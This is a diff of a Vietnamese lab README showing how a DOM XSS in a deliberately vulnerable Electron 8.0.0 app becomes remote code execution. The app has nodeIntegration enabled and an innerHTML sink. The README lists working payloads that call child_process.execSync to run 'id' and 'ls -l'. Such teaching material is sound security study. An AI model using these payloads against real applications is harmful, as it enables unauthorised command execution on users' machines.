@@ -37,7 +37,7 @@ sau đó chạy lại command :
 ```
 npm audit
 ```
-<image 3>
+![2](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/cd2349ca-7629-42b6-bbe5-6d69c97d7425)
 
 XSS to RCE
 Download the first vulnerability file :
@@ -45,7 +45,7 @@ Download the first vulnerability file :
 
 File : 
 vulnerable1/main.js
-<image 4>
+![3](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/4a7efd61-c551-4b04-9c42-72ebdbd4222f)
 
 Như đã thấy :
 1. `nodeIntegration` được bật (`nodeIntegration: true`)**:
@@ -55,7 +55,8 @@ Như đã thấy :
 
 File:
 renderer.js
- <ảnh render má nội>
+ ![4](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/fe5546a0-8657-437a-b3b6-1167166ac820)
+
 
  Nhận diện có innerHTML sink -> DOM XSS in innerHTML sink 
 
@@ -67,22 +68,27 @@ Khai thác :
  npm install
  npm start
 ```
+![5](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/0fde2e41-b063-472b-a976-925dadbc6806)
+
 Sau khi start :
 
-<ảnh về lỗ hổng ứng dụng đã được setup>
+![6](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/4041753a-dbf7-4d33-b79c-6fdf1b70ca78)
 
 Payloads :
+```
 test <img src=x onerror=alert("XSS")>
-<image nghich hình đó>
+```
+![7](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/57a12b6f-4691-46f8-8841-f3f067992d80)
 
+```
 <img src=x onerror="alert(require('child_process').execSync('id').toString());"> 
+```
+![8](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/901d21ef-5400-4c16-955f-d063213abd26)
 
-<hình về id >
-
-
+```
 <img src=x onerror="alert(require('child_process').execSync('ls -l').toString());">
-
-<imge về ls-l>
+```
+![9](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/e0859aa1-ac5e-4189-ad9f-77f706a640d1)
 
 
 
